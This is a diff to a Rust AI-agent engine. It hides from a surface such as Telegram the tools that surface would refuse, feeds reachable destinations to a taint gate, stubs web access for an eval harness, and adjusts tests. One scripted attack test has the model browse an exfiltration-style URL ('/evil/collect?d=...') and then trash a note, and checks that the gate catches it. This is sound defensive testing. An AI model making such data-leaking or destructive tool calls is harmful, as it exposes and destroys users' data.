@@ -584,6 +584,16 @@ impl SynEngine {
                         req.registry.capability_of(&t.function.name, &serde_json::Value::Null).as_ref(),
                     )
             })
+            // Nor one this surface would refuse. Telegram was sent `browse`
+            // and then told no, so the model planned around a tool it could
+            // not have. Only where the capability is known without arguments:
+            // a tool whose capability depends on them is left to the gate.
+            .filter(|t| {
+                match req.registry.capability_of(&t.function.name, &serde_json::Value::Null) {
+                    Some(capability) => run.surface.offers(&t.function.name, Some(&capability)),
+                    None => true,
+                }
+            })
             .collect();
 
         // Of those, what this turn is sent: the core, and the groups the
@@ -820,6 +830,7 @@ impl SynEngine {
                     &crate::syn::gate::View {
                         tainted: taint.is_set(),
                         untrusted_before: run.untrusted_before,
+                        reach: Some(&destinations),
                         surface: run.surface,
                         seen: &seen,
                         ledger: &ledger,
@@ -2003,6 +2014,12 @@ async fn browse<R: tauri::Runtime>(
         // page asked for by address, and these two were chosen for the model.
         browser::nothing_in_hand(req.browser);
 
+        // A task's own web, while the eval harness is running one.
+        #[cfg(any(test, feature = "eval"))]
+        if let Some(found) = crate::syn::eval::web::search(what) {
+            return found;
+        }
+
         let read = browser::visit(req.app, req.browser, &browser::search_url(what)).await?;
         let page = web::reduce(&read.html, &read.url);
 
@@ -2105,6 +2122,11 @@ async fn look_at<R: tauri::Runtime>(
     cap: usize,
 ) -> AppResult<(String, Vec<crate::models::syn::SourceRef>)> {
     use crate::syn::{browser, web};
+
+    #[cfg(any(test, feature = "eval"))]
+    if let Some(found) = crate::syn::eval::web::page(address) {
+        return found;
+    }
 
     // ── Rung 0: it is already on the screen. ──────────────────────
     //
@@ -3399,7 +3421,9 @@ mod driving {
             vec![
                 // A URL that cannot be dialled, so the fetch fails and the flag
                 // stays false — which is the *first* thing this asserts.
-                calls("browse", serde_json::json!({ "what": "http://127.0.0.1/evil" })),
+                // Room for data in it, on a host nobody named: asked about. A
+                // search or a front page no longer is (`taint::browse_carries_nothing`).
+                calls("browse", serde_json::json!({ "what": "http://127.0.0.1/evil/collect?d=quan-trong" })),
                 calls("trash_node", serde_json::json!({ "node_id": "Notes/keep.md" })),
                 ChatReply { content: "xong".into(), tool_calls: vec![], usage: Default::default(), duration_ms: None },
             ],
@@ -5767,10 +5791,19 @@ mod driving {
     // ── which tools a turn is sent ─────────────────────────────────
 
     async fn offered_for(ask: &str, script: Vec<ChatReply>) -> Vec<Vec<String>> {
+        offered_on(crate::syn::surface::Surface::App, ask, script).await
+    }
+
+    async fn offered_on(
+        surface: crate::syn::surface::Surface,
+        ask: &str,
+        script: Vec<ChatReply>,
+    ) -> Vec<Vec<String>> {
         let dir = tempfile::tempdir().expect("temp");
         let vault = dir.path().to_str().expect("utf8").to_string();
         let db = a_vault_worth_attacking(dir.path());
         let mut run = Run::new(ask, Some("conv-tools".into()), budget(4));
+        run.surface = surface;
         let provider = std::sync::Arc::new(Scripted::new(&vault, &run.id, script));
         let engine = SynEngine::new(Box::new(SharedProvider(provider.clone())));
         let app = app();
@@ -5798,6 +5831,17 @@ mod driving {
             .expect("answers");
         let offered = provider.offered.lock().expect("lock").clone();
         offered
+    }
+
+    /// Telegram is not sent what it would refuse: offering `browse` and then
+    /// saying no had the model plan around a tool it could not have.
+    #[tokio::test]
+    async fn a_surface_is_not_offered_what_it_would_refuse() {
+        let phone = offered_on(crate::syn::surface::Surface::Telegram, "tin tức hôm nay", vec![text("xong")]).await;
+        assert!(!phone[0].contains(&"browse".to_string()), "{:?}", phone[0]);
+        assert!(phone[0].contains(&"query_nodes".to_string()));
+        let app = offered_for("tin tức hôm nay", vec![text("xong")]).await;
+        assert!(app[0].contains(&"browse".to_string()), "{:?}", app[0]);
     }
 
     /// A plain question is sent the core; one about money brings the finance
